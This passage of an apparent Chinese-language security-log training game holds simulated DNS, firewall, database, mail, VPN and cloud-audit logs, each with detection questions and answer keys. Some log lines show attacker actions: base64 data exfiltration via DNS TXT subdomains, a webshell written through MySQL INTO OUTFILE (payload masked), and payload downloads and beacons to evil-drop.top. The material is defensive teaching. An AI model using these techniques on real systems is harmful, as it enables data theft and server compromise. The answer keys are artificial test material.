  /* ========== ④ DNS 日志 ========== */
  { id: 'd1', ico: '🎭', title: 'DNS 日志 · 仿冒域名', cat: 'DNS 日志', diff: 1,
    brief: '解析日志里混着几个"长得像大厂"的域名。',
    files: { '/logs/dns_resolve.log': [
      '02:00:10 10.1.3.7 paypal.com -> 64.4.250.29 (TTL 300)',
      '02:00:35 10.1.3.7 paypa1.com -> 45.83.90.12 (TTL 60)',
      '02:01:10 10.1.2.9 micr0soft-verify.com -> 45.83.90.19 (TTL 60)',
      '02:01:40 10.1.2.9 appleid-support.net -> 45.83.90.19 (TTL 60)',
      '02:02:20 10.1.3.7 mail.google.com -> 142.250.71.9 (TTL 300)',
    ]},
    tasks: [
      { q: '仿冒 PayPal 的域名（注意字母）', hint: 'cat /logs/dns_resolve.log', ans: ['paypa1.com'], teach: '🎭 数字 1 冒充字母 l 的 typosquatting，全靠肉眼+搜索引擎比对。' },
      { q: '解析到 45.83.90.19 的仿冒域名（任答其一）', hint: 'grep "45.83.90.19" /logs/dns_resolve.log', ans: ['micr0soft-verify.com', 'appleid-support.net'], teach: '🔗 多个仿冒域名指向同一 IP=同一攻击者的基础设施，一锅端。' },
      { q: '查询仿冒域名的内网 IP（micr0soft 那条的来源）', hint: '看 micr0soft 行的第一个字段', ans: ['10.1.2.9'], teach: '🏠 内网机器在查仿冒域名=有同事可能已点击钓鱼链接，值得核一眼。' },
    ],
    victory: ['结论：paypa1.com 等 3 个仿冒域名活跃，两个同源 45.83.90.19。', '处置：内网封禁+报备注册商+对查询过它们的内网 IP 做用户提醒。'] },

  { id: 'd2', ico: '🧟', title: 'DNS 日志 · C2 心跳', cat: 'DNS 日志', diff: 2,
    brief: '有个域名每隔固定时间就被同一台机器查询——规律得不像人。',
    files: { '/logs/dns_query.log': [
      '10:00:00 10.1.2.33 A cdn-metrics.top',
      '10:01:00 10.1.2.33 A cdn-metrics.top',
      '10:02:00 10.1.2.33 A cdn-metrics.top',
      '10:03:00 10.1.2.33 A cdn-metrics.top',
      '10:03:10 10.1.2.5 A www.baidu.com',
      '10:04:00 10.1.2.33 A cdn-metrics.top',
      '10:05:00 10.1.2.33 A cdn-metrics.top',
    ]},
    tasks: [
      { q: 'C2 心跳域名', hint: 'grep "10.1.2.33" /logs/dns_query.log 看反复出现的名字', ans: ['cdn-metrics.top'], teach: '🧟 精确 60 秒一次的查询=机器心跳。人上网不会这么规律。' },
      { q: '发起心跳的内网主机 IP', hint: '看查询来源列', ans: ['10.1.2.33'], teach: '🎯 心跳主机=失陷主机。拿域名反查全网，可能还有同伴。' },
      { q: '心跳间隔（秒）', hint: '相邻两条的时间差', ans: ['60', '60秒'], teach: '⏱️ 间隔还是木马配置里的"睡眠时间"，情报价值极高。' },
    ],
    victory: ['结论：10.1.2.33 每 60 秒心跳一次 cdn-metrics.top，属木马 C2 通信。', '处置：封域名+隔离主机+按心跳特征全网狩猎同类。'] },

  { id: 'd3', ico: '📡', title: 'DNS 日志 · 隧道外传', cat: 'DNS 日志', diff: 3,
    brief: 'TXT 查询里的子域名长得像乱码——其实那是被切碎的数据。',
    files: { '/logs/dns_query.log': [
      '02:00:01 10.1.4.8 TXT aXNvY2QudG9rZW4=.r1.data-t.exfil-cdn.net',
      '02:00:01 10.1.4.8 TXT cGFzc3dvcmQzNDU=.r2.data-t.exfil-cdn.net',
      '02:00:02 10.1.4.8 TXT aHJfbWFzdGVy.x9.data-t.exfil-cdn.net',
      '02:00:02 10.1.4.8 TXT c3FsX2R1bXAuemlw.q3.data-t.exfil-cdn.net',
      '02:00:05 10.1.4.8 A www.baidu.com',
    ]},
    tasks: [
      { q: '隧道主域名', hint: '看超长子域名共同的结尾', ans: ['exfil-cdn.net'], teach: '🕳️ 数据被 base64 切块塞进子域名逐段寄出。' },
      { q: '进行隧道通信的内网 IP', hint: '看 TXT 行的来源列', ans: ['10.1.4.8'], teach: '🎯 纯 DNS 通道没有 HTTP 流量——这是它隐蔽的原因。' },
      { q: '隧道使用的 DNS 记录类型', hint: '每行 A 之前的那个字段', ans: ['TXT', 'txt'], teach: '📡 TXT 可携带 255 字符，是隧道首选。对内网 TXT 查询直接告警。' },
    ],
    victory: ['结论：10.1.4.8 经 exfil-cdn.net 的 TXT 隧道分块外传密码与数据库压缩包。', '处置：封域名+隔离主机+DNS 出口收敛。'] },

  /* ========== ⑤ 防火墙/网关日志 ========== */
  { id: 'f1', ico: '🧭', title: '防火墙日志 · 端口扫描', cat: '防火墙网关日志', diff: 1,
    brief: 'DROP 记录里藏着一个"敲门狂魔"，看看它在找哪扇门。',
    files: { '/logs/fw_gateway.log': [
      '02:10:01 DROP TCP 203.0.113.51:40001 -> 10.1.2.33:22',
      '02:10:01 DROP TCP 203.0.113.51:40002 -> 10.1.2.33:80',
      '02:10:02 DROP TCP 203.0.113.51:40003 -> 10.1.2.33:445',
      '02:10:02 DROP TCP 203.0.113.51:40004 -> 10.1.2.33:3389',
      '02:10:03 DROP TCP 203.0.113.51:40005 -> 10.1.2.33:445',
      '02:10:03 DROP TCP 203.0.113.51:40006 -> 10.1.2.33:3306',
      '02:10:04 DROP TCP 203.0.113.51:40007 -> 10.1.2.33:445',
      '02:10:04 DROP TCP 203.0.113.51:40008 -> 10.1.2.33:6379',
      '02:10:05 DROP TCP 203.0.113.51:40009 -> 10.1.2.33:445',
    ]},
    tasks: [
      { q: '扫描来源 IP', hint: 'grep DROP /logs/fw_gateway.log 后看来源列', ans: ['203.0.113.51'], teach: '🧭 全是 DROP=门都关着，但"谁在敲门"要记入观察名单。' },
      { q: '被敲门次数最多的端口', hint: "grep DROP 后 awk '{print $6}' 再统计", ans: ['445'], teach: '🎯 445(SMB) 被"重点照顾"3 次——它在找永恒之蓝那类门。' },
      { q: '防火墙对这些包的动作（大写英文）', hint: '每行第一个词', ans: ['drop'], teach: '🛡️ DROP=静默丢弃。日志证明防线有效，按低价值归档观察。' },
    ],
    victory: ['结论：203.0.113.51 全端口扫描，重点试探 445。', '处置：封禁来源+保持观察；若出现 ACCEPT 记录则升级应急。'] },

  { id: 'f2', ico: '⛏️', title: '防火墙日志 · 可疑出站', cat: '防火墙网关日志', diff: 2,
    brief: '出站规则普遍收紧，但有一条 ACCEPT 格外扎眼。',
    files: { '/logs/fw_gateway.log': [
      '02:00:01 ACCEPT TCP 10.1.2.40:52000 -> 10.1.1.10:3306 (mysql 业务)',
      '02:05:00 ACCEPT TCP 10.1.2.33:51322 -> 91.243.72.5:3333',
      '02:05:01 ACCEPT TCP 10.1.2.33:51323 -> 91.243.72.5:3333',
      '02:06:00 ACCEPT TCP 10.1.2.33:51330 -> 91.243.72.5:3333',
      '02:10:00 ACCEPT TCP 10.1.2.5:52100 -> 10.1.1.20:443 (官网 API)',
    ]},
    tasks: [
      { q: '发起可疑出站的内网 IP', hint: 'grep "3333" /logs/fw_gateway.log', ans: ['10.1.2.33'], teach: '🎯 业务服务器连境外 3333（矿池端口）——和挖矿木马的关联一查一个准。' },
      { q: '目标端口', hint: '那几条 ACCEPT 的目的端口', ans: ['3333'], teach: '🚪 3333/4444/5555 是常见矿池端口，出口封禁是断根手段。' },
      { q: '这个行为的定性（输 check 两个字）', hint: '高 CPU+矿池端口=?', ans: ['挖矿'], teach: '⛏️ 防火墙日志+主机 CPU 指标交叉，就是挖矿木马的标准定性流程。' },
    ],
    victory: ['结论：10.1.2.33 持续外联矿池 91.243.72.5:3333。', '处置：主机清挖矿+出口封矿池段+排查该主机持久化。'] },

  { id: 'f3', ico: '🧊', title: '防火墙日志 · 勒索 C2 与失守主机', cat: '防火墙网关日志', diff: 3,
    brief: '多条内网主机被拦截的 C2 记录里，混着一条"曾经放行"的旧记录……',
    files: { '/logs/fw_gateway.log': [
      '01:40:00 BLOCK TCP 10.1.2.41:50100 -> lockbit-c2.top:443',
      '01:40:01 BLOCK TCP 10.1.2.55:50200 -> lockbit-c2.top:443',
      '01:40:02 BLOCK TCP 10.1.2.33:50300 -> lockbit-c2.top:443',
      '01:40:03 BLOCK TCP 10.1.2.55:50201 -> lockbit-c2.top:443',
      '01:20:00 ACCEPT TCP 10.1.2.60:50400 -> lockbit-c2.top:443 (旧策略放行)',
      '01:20:30 ACCEPT TCP 10.1.2.60:50401 -> lockbit-c2.top:443',
    ]},
    tasks: [
      { q: '勒索 C2 的域名', hint: 'cat /logs/fw_gateway.log 找反复出现的域名', ans: ['lockbit-c2.top'], teach: '🧊 多台内网机器同时连一个陌生域名=勒索家族在预热。' },
      { q: '被放行过（可能已失守）的内网 IP', hint: 'grep ACCEPT /logs/fw_gateway.log', ans: ['10.1.2.60'], teach: '🚨 BLOCK 是好消息，ACCEPT 是坏消息——60 这台机器的 C2 已经通了。' },
      { q: '被 BLOCK 拦截的主机数量（输 check 数字）', hint: '数一数不同内网 IP', ans: ['3', '三'], teach: '🔢 拿同一 C2 域名反查全网日志，就能数清"已拦/已通"两个名单。' },
    ],
    victory: ['结论：lockbit-c2.top 预热通信中；10.1.2.60 被旧策略放行需立即隔离。', '处置：隔离 .60 → 全网封域名 → 核对三台 BLOCK 主机。'] },

  /* ========== ⑥ 数据库日志 ========== */
  { id: 'q1', ico: '📤', title: '数据库日志 · 拖库', cat: '数据库日志', diff: 1,
    brief: '通用查询日志里，整张整张的表在深夜被搬空。',
    files: { '/logs/mysql_general.csv': [
      'ts,client,query,rows',
      '02:12:55,"198.51.100.23","SELECT * FROM users WHERE id=1",1',
      '02:13:01,"198.51.100.23","SELECT * FROM users",120000',
      '02:13:10,"198.51.100.23","SELECT * FROM orders",860000',
      '02:13:40,"198.51.100.23","SELECT * FROM payments",310000',
      '09:00:01,"app@10.1.2.40","SELECT * FROM users WHERE id=88",1',
    ]},
    tasks: [
      { q: '拖库来源 IP', hint: 'grep "SELECT" /logs/mysql_general.csv 看凌晨那批', ans: ['198.51.100.23'], teach: '📤 凌晨+陌生 IP+整表 SELECT（十万行级）=拖库三要素。' },
      { q: '被搬运行数最多的表', hint: '看 rows 最大那条', ans: ['orders'], teach: '🗄️ orders 86 万行——订单数据黑市硬通货。' },
      { q: '拖库发生的时间点（时:分）', hint: '看第一条整表 SELECT', ans: ['02:13'], teach: '⏱️ 02:12:55 还在"按 id 查一条"（踩点），02:13:01 开始全表搬——转场只用了 6 秒。' },
    ],
    victory: ['结论：198.51.100.23 于 02:13 起拖走 users/orders/payments 共 129 万行。', '整改：应用账号禁全表权限+大结果集告警+敏感字段加密。'] },

  { id: 'q2', ico: '🔑', title: '数据库日志 · 弱口令登录', cat: '数据库日志', diff: 2,
    brief: '审计日志里 root 的登录来源换成了陌生地址……',
    files: { '/logs/mysql_audit.csv': [
      '02:05:00,"root@203.0.113.88","Access denied for user root (using password: YES)"',
      '02:05:05,"root@203.0.113.88","Access denied for user root (using password: YES)"',
      '02:05:11,"root@203.0.113.88","Access denied for user root (using password: YES)"',
      '02:05:18,"root@203.0.113.88","Connection established (password OK)"',
      '02:05:20,"root@203.0.113.88","QUERY: SHOW DATABASES"',
      '02:05:26,"root@203.0.113.88","QUERY: SELECT * FROM finance.salary"',
    ]},
    tasks: [
      { q: '被爆破的数据库账号', hint: 'grep "Access denied" /logs/mysql_audit.csv', ans: ['root'], teach: '🔑 数据库 root 也被爆破——数据库往往没有失败锁定策略。' },
      { q: '爆破来源 IP', hint: '看 client 列', ans: ['203.0.113.88'], teach: '🎯 与 Web 层同一攻击源——多条日志串起来才是完整案情。' },
      { q: '登录成功后执行的第一条命令', hint: 'grep "password OK" 之后的第一条 QUERY', ans: ['SHOW DATABASES', 'show databases'], teach: '📜 "先看仓库有什么再搬"——和拖库案是同一个攻击者的连贯动作。' },
    ],
    victory: ['结论：203.0.113.88 三次爆破后以 root 登入数据库，查库并触及 finance.salary。', '整改：数据库禁 root 远程+失败锁定+审计外发。'] },

  { id: 'q3', ico: '🧪', title: '数据库日志 · INTO OUTFILE 写马', cat: '数据库日志', diff: 3,
    brief: '有人借数据库的"写文件"能力，往 Web 目录塞了个东西……',
    files: { '/logs/mysql_audit.csv': [
      '03:01:00,"root@203.0.113.88","QUERY: SHOW VARIABLES LIKE \'secure_file_priv\'"',
      '03:01:10,"root@203.0.113.88","QUERY: SELECT \'<?php /*payload-masked*/ ?>\' INTO OUTFILE \'/var/www/html/uploads/x.php\'"',
      '03:01:12,"root@203.0.113.88","QUERY: SELECT \'OK\' INTO OUTFILE \'/var/www/html/uploads/x.php\'"',
      '03:02:00,"root@203.0.113.88","QUERY: SELECT @@version"',
    ]},
    tasks: [
      { q: '被写出的 Webshell 完整路径', hint: 'grep OUTFILE /logs/mysql_audit.csv', ans: ['/var/www/html/uploads/x.php'], teach: '🧪 SELECT ... INTO OUTFILE 是 MySQL 写文件能力，secure_file_priv 为空时最危险（载荷内容已脱敏）。' },
      { q: '写马动作的定性（输 check 两个字）', hint: '往 Web 目录写可执行脚本=?', ans: ['写马', 'webshell', '后门'], teach: '💉 数据库→Web 目录的跨越=把数据库漏洞升级成服务器失陷。' },
      { q: '攻击者最先确认的数据库配置项（输 check 变量名）', hint: '第一条 QUERY 里 LIKE 的那个词', ans: ['secure_file_priv'], teach: '🔎 攻击者先查"能不能写文件"再动手——高手作案也讲流程。' },
    ],
    victory: ['结论：root 经 INTO OUTFILE 向 Web 目录写入 x.php 一句话木马。', '根除：删文件 → 设 secure_file_priv=NULL → 数据库账号最小权限。'] },

  /* ========== ⑦ 邮件网关日志 ========== */
  { id: 'm1', ico: '📧', title: '邮件日志 · 钓鱼群发', cat: '邮件网关日志', diff: 1,
    brief: '同一主题的邮件如潮水般涌来，好在网关拦了大半。',
    files: { '/logs/mailgw.log': [
      '02:00:01 FROM invoice-notice.cn RCPT=56 ACTION=QUARANTINE subject="电子发票-请查收"',
      '02:00:01 FROM invoice-notice.cn RCPT=48 ACTION=QUARANTINE subject="电子发票-请查收"',
      '02:00:02 FROM invoice-notice.cn RCPT=31 ACTION=QUARANTINE subject="电子发票-请查收"',
      '02:00:03 FROM invoice-notice.cn RCPT=1 ACTION=DELIVERED subject="电子发票-请查收" to=hr02',
    ]},
    tasks: [
      { q: '仿冒发件域名', hint: 'grep QUARANTINE /logs/mailgw.log', ans: ['invoice-notice.cn'], teach: '📧 136 封同主题邮件从一个域名群发——标准钓鱼 Campaign。' },
      { q: '该 Campaign 的总收件人数（输 check 数字）', hint: '56+48+31+1', ans: ['136'], teach: '🔢 数量级决定处置规模：全员通报 vs 点对点排查。' },
      { q: '有一封漏网送到了谁手里（输 check 用户名）', hint: 'grep DELIVERED /logs/mailgw.log', ans: ['hr02'], teach: '🚨 拦截率 99% 也必须追那 1%——找到 hr02 提醒"别点附件"。' },
    ],
    victory: ['结论：invoice-notice.cn 群发钓鱼 136 封，135 封拦截，1 封到达 hr02。', '处置：撤回+提醒 hr02+域名拉黑+通报全员。'] },

  { id: 'm2', ico: '🧧', title: '邮件日志 · BEC 假 CFO', cat: '邮件网关日志', diff: 2,
    brief: '一封"高管"邮件穿过了网关，收件人是财务。',
    files: { '/logs/mailgw.log': [
      '11:02:00 FROM cfo@corpf-cfo.com RCPT=1 ACTION=DELIVERED subject="紧急：供应商账户变更" to=xiaolin',
      '11:02:00 SPF: fail (corpf-cfo.com 未授权发信)',
      '11:05:00 FROM cfo@corpf-cfo.com RCPT=1 ACTION=DELIVERED subject="RE: 紧急：供应商账户变更" to=xiaolin',
    ]},
    tasks: [
      { q: '仿冒发件域名', hint: 'grep DELIVERED /logs/mailgw.log 看 FROM', ans: ['corpf-cfo.com'], teach: '🎭 官方是 corpf.com，仿冒多个 -cfo。SPF fail 就是"身份存疑"的技术实锤。' },
      { q: '收件人（输 check 用户名）', hint: '看 to= 字段', ans: ['xiaolin'], teach: '🎯 财务专人被点名——BEC 都做功课，攻击者知道找谁。' },
      { q: 'SPF 校验结果（大写英文）', hint: '邮件头那一行', ans: ['fail'], teach: '📮 SPF fail=发信服务器不在官方白名单。DMARC 设 p=reject 能直接拒收。' },
    ],
    victory: ['结论：corpf-cfo.com 仿冒 CFO 的两封邮件送达财务 xiaolin（SPF fail）。', '处置：提醒中止付款+回拨核实+推进 DMARC p=reject。'] },

  { id: 'm3', ico: '🪤', title: '邮件日志 · 附件投递链', cat: '邮件网关日志', diff: 3,
    brief: '一封带"简历"附件的邮件送达了 HR，上网行为日志里紧接着有了下文……',
    files: {
      '/logs/mailgw.log': [
        '14:00:01 FROM recruit@job-elite-hr.cn RCPT=1 ACTION=DELIVERED to=hr02 subject="恭喜进入终面" attach="简历.pdf.exe"',
      ],
      '/logs/proxy_access.log': [
        '14:03:11 hr02 GET http://evil-drop.top/dl/client.exe -> 200 (downloaded 12MB)',
        '14:05:40 hr02 POST http://evil-drop.top/beacon -> 200 (periodic)',
        '14:06:00 zhangwei GET https://www.baidu.com',
      ],
    },
    tasks: [
      { q: '打开邮件并下载载荷的用户', hint: 'cat /logs/proxy_access.log 看第一条的账号', ans: ['hr02'], teach: '🪤 邮件日志(投递) + 代理日志(下载) 两段拼接=完整投递链。单看一段都会漏。' },
      { q: '伪装成简历的附件名', hint: 'grep attach /logs/mailgw.log', ans: ['简历.pdf.exe'], teach: '🎭 双后缀：系统只显示"简历.pdf"，.exe 藏在后面。' },
      { q: '载荷下载与心跳的域名', hint: 'grep "evil" /logs/proxy_access.log', ans: ['evil-drop.top'], teach: '📞 下载(14:03)+心跳(14:05 周期性 POST)=木马已上线。封域名+隔离终端。' },
    ],
    victory: ['结论：hr02 打开简历.pdf.exe 并下载载荷，木马经 evil-drop.top 心跳上线。', '处置：隔离 hr02 终端 → 重置其凭据 → 网关撤回同 Campaign。'] },

  /* ========== ⑧ 应用/业务日志 ========== */
  { id: 'a1', ico: '🔁', title: '业务日志 · 撞库攻击', cat: '应用业务日志', diff: 1,
    brief: '登录接口的失败记录里，同一个 IP 换着账号试……',
    files: { '/logs/app_login.log': [
      '02:00:01 LOGIN user=zhangwei ip=45.33.32.156 result=FAIL',
      '02:00:02 LOGIN user=lisi ip=45.33.32.156 result=FAIL',
      '02:00:02 LOGIN user=wangfang ip=45.33.32.156 result=FAIL',
      '02:00:03 LOGIN user=chenbo ip=45.33.32.156 result=FAIL',
      '02:00:04 LOGIN user=hr02 ip=45.33.32.156 result=FAIL',
      '02:00:05 LOGIN user=wangfang ip=45.33.32.156 result=OK',
      '02:00:06 LOGIN user=test01 ip=45.33.32.156 result=FAIL',
    ]},
    tasks: [
      { q: '撞库来源 IP', hint: 'grep FAIL /logs/app_login.log', ans: ['45.33.32.156'], teach: '🔁 同 IP 换不同用户名试密码=撞库（拿别处泄露的密码来试）。' },
      { q: '被试出（登录成功）的账号', hint: 'grep "result=OK" /logs/app_login.log', ans: ['wangfang'], teach: '🎯 撞库成功=该用户在别处泄露过同款密码。强制改密+下线。' },
      { q: '攻击者总共尝试的失败次数（输 check 数字）', hint: '数 FAIL 行', ans: ['6', '六'], teach: '🔢 撞库特征：失败多、账号杂、来源单一。对策：各站不同密码+登录限速。' },
    ],
    victory: ['结论：45.33.32.156 对 7 个账号撞库，wangfang 被试出。', '处置：冻结 wangfang 会话+强制改密+来源封禁。'] },

  { id: 'a2', ico: '🌍', title: '业务日志 · VPN 时空矛盾', cat: '应用业务日志', diff: 2,
    brief: '同一个账号，五分钟内出现在两个不可能同时存在的城市。',
    files: { '/logs/vpn_session.log': [
      '09:00:00 LOGIN user=lisi loc=Beijing,CN ip=10.1.5.7 device=iPhone15 dev_id=D8899',
      '09:05:00 LOGIN user=lisi loc=Frankfurt,DE ip=45.83.90.12 device=unknown',
      '09:06:00 ACCESS user=lisi res=/files/salary_2026.xlsx action=DOWNLOAD',
      '09:08:00 LOGIN user=zhangwei loc=Beijing,CN ip=10.1.5.7 device=iPhone15 dev_id=D8899',
    ]},
    tasks: [
      { q: '被盗用的账号', hint: 'cat /logs/vpn_session.log 找两地登录的用户', ans: ['lisi'], teach: '🌍 物理上不可能的两地登录=账号被盗的高置信证据。' },
      { q: '境外登录会话下载的敏感文件名', hint: 'grep DOWNLOAD /logs/vpn_session.log', ans: ['salary_2026.xlsx'], teach: '📥 登录后直奔薪酬文件——目标明确的数据窃取。' },
      { q: '两次登录的间隔（分钟，输 check 数字）', hint: '09:00 与 09:05', ans: ['5', '五'], teach: '⏱️ 间隔 5 分钟——VPN 登录+敏感下载的速度快过任何人工核实流程，必须自动拦截。' },
    ],
    victory: ['结论：lisi 账号被境外登录并下载薪酬文件（与北京会话仅隔 5 分钟）。', '处置：强制下线+冻结+密码重置+核实 09:06 的下载记录。'] },

  { id: 'a3', ico: '🔓', title: '业务日志 · 越权遍历', cat: '应用业务日志', diff: 3,
    brief: '某用户的接口访问从"查自己"变成了"挨个翻别人"。',
    files: { '/logs/oa_access.log': [
      '10:00:00 user=zhangwei GET /api/employee?id=1001 (本人) 200',
      '10:01:10 user=zhangwei GET /api/employee?id=1042 200',
      '10:01:11 user=zhangwei GET /api/employee?id=1043 200',
      '10:01:12 user=zhangwei GET /api/employee?id=1044 200',
      '10:01:30 user=zhangwei GET /api/employee?id=1050 200',
      '10:02:00 user=lisi GET /api/employee?id=1001 (本人) 200',
    ]},
    tasks: [
      { q: '越权访问的用户', hint: 'cat /logs/oa_access.log 看 1042 之后还在查的账号', ans: ['zhangwei'], teach: '🔓 1001 是本人，1042-1050 是别人——服务端没校验"数据属主"，水平越权。' },
      { q: '被遍历的最大员工 ID（输 check 数字）', hint: '看最后一条 employee 查询', ans: ['1050'], teach: '🔢 从 1042 连续递增到 1050=脚本化遍历，一次拉走 9 份他人档案。' },
      { q: '这个漏洞的根因（输 check：服务端缺什么校验）', hint: '改 id 参数就能看别人数据=缺？', ans: ['属主', '归属', '权限', '鉴权', '校验'], teach: '🏛️ 垂直越权看角色，水平越权看属主。服务端必须校验"这条数据是不是你的"。' },
    ],
    victory: ['结论：zhangwei 借未校验属主的接口遍历 id=1042~1050 的他人档案。', '修复：接口加数据属主校验+单用户查询频控+越权审计。'] },

  /* ========== ⑨ VPN 接入日志 ========== */
  { id: 'v1', ico: '🌐', title: 'VPN 日志 · 多地爆发登录', cat: 'VPN 接入日志', diff: 1,
    brief: '一个运维账号一小时内出现在三个国家——人不可能瞬移。',
    files: { '/logs/vpn_auth.csv': [
      'ts,user,country,ip,result',
      '20:00:00,ops01,China,10.1.5.7,OK',
      '20:31:00,ops01,Germany,45.83.90.12,OK',
      '20:52:00,ops01,Brazil,196.52.43.7,OK',
      '21:10:00,ops01,Germany,45.83.90.12,OK',
      '21:30:00,zhangwei,China,10.1.5.9,OK',
    ]},
    tasks: [
      { q: '被盗用的账号', hint: 'cat /logs/vpn_auth.csv 看一小时三国的用户', ans: ['ops01'], teach: '🌍 一小时三国在物理上不可能——典型的凭据被盗后自动化登录。' },
      { q: '最早的异常登录国家（英文）', hint: '看 20:31 那条', ans: ['germany', '德国'], teach: '📍 最早异常点是攻击者拿到密码的第一刻，常用于定位泄露时间。' },
      { q: '这类事件的定性（输 check 两个字）', hint: '密码从别处泄露来试 VPN=?', ans: ['盗号', '撞库', '盗用'], teach: '🔁 撞库/盗号的对策：MFA+异地二次验证+泄露密码监控。' },
    ],
    victory: ['结论：ops01 凭据泄露，1 小时内被德国/巴西两地登录。', '处置：强制下线+改密+撤销全部会话+排查异地会话的下载行为。'] },

  { id: 'v2', ico: '📲', title: 'VPN 日志 · MFA 疲劳攻击', cat: 'VPN 接入日志', diff: 2,
    brief: '深夜 47 次推送轰炸后，用户终于手滑点了"允许"。',
    files: { '/logs/vpn_mfa.csv': [
      '23:40:01 LOGIN user=hr02 pass=OK mfa=PUSH sent',
      '23:40:31 mfa=PUSH sent (第 5 次)',
      '23:45:00 mfa=PUSH sent (第 12 次)',
      '23:50:00 mfa=PUSH sent (第 20 次)',
      '23:52:10 mfa=PUSH result=ALLOWED by user (第 27 次)',
      '23:52:15 LOGIN user=hr02 result=OK session=established',
    ]},
    tasks: [
      { q: '这种攻击手法叫什么（输 check：MFA+两字）', hint: '几十次推送轰炸到你点允许为止', ans: ['mfa疲劳', '疲劳', '轰炸', '推送疲劳'], teach: '📲 MFA 疲劳（推送轰炸）：赌你深夜烦了手滑点允许。对策：号码匹配/数字匹配 MFA。' },
      { q: '攻击者总共发起了多少次推送（输 check 数字）', hint: '最后一次是第 27 次，前面试了多少次？', ans: ['27', '二十七'], teach: '🔢 27 次推送终于命中一次——MFA 疲劳的命中率完全靠"烦"出来的。' },
      { q: '攻击者最终拿到了什么（输 check：已建立的___）', hint: '23:52:15 那行', ans: ['session', '会话', 'vpn'], teach: '🔑 拿到的是合法会话——之后所有行为都"看起来像正常登录"，必须撤销会话而非只改密码。' },
    ],
    victory: ['结论：hr02 遭 MFA 疲劳攻击，第 27 次推送被误点允许，攻击者建立 VPN 会话。', '处置：立即终止会话+改密+更换为数字匹配 MFA。'] },

  { id: 'v3', ico: '📦', title: 'VPN 日志 · 离职账号仍在活跃', cat: 'VPN 接入日志', diff: 3,
    brief: '人事系统里他 9 月 1 日就离职了，VPN 日志里他 9 月 5 日还在登录……',
    files: { '/logs/vpn_auth.csv': [
      '09:01:00 LOGIN user=lilei loc=Beijing ip=10.1.5.7 result=OK',
      '09:05:22 LOGIN user=lilei loc=Beijing ip=111.199.10.5 result=OK  (家庭宽带)',
      '09:05:30 ACCESS user=lilei res=/proj/clients.csv action=DOWNLOAD',
      '09:06:00 ACCESS user=lilei res=/proj/pricing_v9.docx action=DOWNLOAD',
      '09:07:00 LOGIN user=hr02 loc=Beijing ip=10.1.5.7 result=OK',
    ],
    '/logs/hr_offboard.csv': [
      'employee,team,last_day,account_status',
      'lilei,销售部,2026-09-01,active（未禁用！）',
      'wangfang,人事部,2026-08-15,disabled',
    ]},
    tasks: [
      { q: '离职后仍登录的违规账号', hint: '对比两份文件找"已离职但还活跃"的人', ans: ['lilei'], teach: '📦 离职账号未禁用=最容易被忽略的后门，也是数据外带高发期。' },
      { q: '他的最后工作日（月-日）', hint: '看 hr_offboard.csv', ans: ['09-01', '2026-09-01'], teach: '📅 权限回收应在最后工作日当天完成，而非"以后再说"。' },
      { q: '根因是流程缺了哪一步（输 check 两个字）', hint: '账号状态一栏写着什么？', ans: ['禁用', '回收', '注销'], teach: '🏛️ 离职流程必须有"账号禁用+权限回收"卡点，HR 与 IT 联动。' },
    ],
    victory: ['结论：lilei 离职 4 天后仍登录并下载客户名单与定价文档。', '处置：立即禁用+审计其全部下载+法律评估+补流程卡点。'] },

  /* ========== ⑩ 云平台审计日志 ========== */
  { id: 'c1', ico: '☁️', title: '云审计 · AccessKey 泄露外联', cat: '云平台审计日志', diff: 1,
    brief: '云审计日志里，一把"只该在服务器上用"的钥匙从境外开了门。',
    files: { '/logs/cloud_audit.csv': [
      'ts,access_key,event,src,detail',
      '02:00:01,AKIAIOSFODNN7,ListBuckets,10.1.2.40,正常业务',
      '03:12:00,AKIAIOSFODNN7,ListBuckets,45.83.90.12,境外 IDC',
      '03:12:05,AKIAIOSFODNN7,GetObject s3://backup-db/full.sql,45.83.90.12,下载 2.1GB',
      '03:13:00,AKIAIOSFODNN7,CreateUser new-user=hx1,45.83.90.12,⚠️ 创建子账号',
    ]},
    tasks: [
      { q: '泄露的 AccessKey ID', hint: 'cat /logs/cloud_audit.csv', ans: ['AKIAIOSFODNN7'], teach: '☁️ AK 泄露=拿着你的云身份进门。硬编码在代码仓库/前端是最常见泄露源。' },
      { q: '异常调用的来源 IP', hint: '看 03:12 之后的 src 列', ans: ['45.83.90.12'], teach: '🌍 正常在 10.1.2.40、异常在境外 IDC——同一把钥匙两个世界。' },
      { q: '攻击者做的最危险动作', hint: '看 detail 列那条带 ⚠️ 的', ans: ['createuser', '创建用户', '创建子账号'], teach: '🔥 拖库只是开始，创建持久化子账号才是"长期占有"。密钥泄露必须轮换+审计子账号。' },
    ],
    victory: ['结论：AKIAIOSFODNN7 泄露，境外拖走 2.1GB 数据库备份并创建持久化子账号。', '处置：立即轮换密钥 → 删子账号 → 核对对象存储访问清单 → 代码仓库扫硬编码。'] },

  { id: 'c2', ico: '🧱', title: '云审计 · 安全组被全放开', cat: '云平台审计日志', diff: 2,
    brief: '凌晨三点，有人把 22 端口对全宇宙开放了。',
    files: { '/logs/cloud_audit.csv': [
      '03:00:01,ops01@console,AuthorizeSecurityGroupEntry,sg-01,协议=TCP 端口=22 来源=0.0.0.0/0',
      '03:00:40,ops01@console,AuthorizeSecurityGroupEntry,sg-01,协议=TCP 端口=3389 来源=0.0.0.0/0',
      '03:05:00,system,ConfigChange,sg-01,变更前: 22 仅限 10.0.0.0/8',
      '06:00:00,system,ScanDetected,sg-01,22 端口遭外网扫描 ×2300',
    ]},
    tasks: [
      { q: '被对全网开放的端口（输 check 数字）', hint: 'grep "0.0.0.0" /logs/cloud_audit.csv 看端口字段', ans: ['22', '3389'], teach: '🧱 22/3389 对 0.0.0.0/0 开放=把爆破面直接焊在大门外。' },
      { q: '授权来源（表示"任何地址"）', hint: '那个经典的四零写法', ans: ['0.0.0.0/0'], teach: '🌐 0.0.0.0/0=全世界。云上安全组变更必须有审批+自动回收。' },
      { q: '事件定性（输 check 四个字）', hint: '这不是攻击，是运维把门拆了', ans: ['配置错误', '误配置', '错误配置'], teach: '⚙️ OWASP A05 安全配置错误——云上最常见的事故源头。扫描 2300 次就是后果。' },
    ],
    victory: ['结论：ops01 凌晨将 22/3389 对全网开放，6 小时内被扫描 2300 次。', '处置：立即收紧安全组 → 审计该时段登录 → 推进安全组自动基线检测。'] },

  { id: 'c3', ico: '🧑‍💼', title: '云审计 · 控制台凭空建号', cat: '云平台审计日志', diff: 3,
    brief: 'RAM 审计里多了一个拥有最高权限的新用户——创建者不是任何人。',
    files: { '/logs/cloud_audit.csv': [
      'ts,user,event,src,detail',
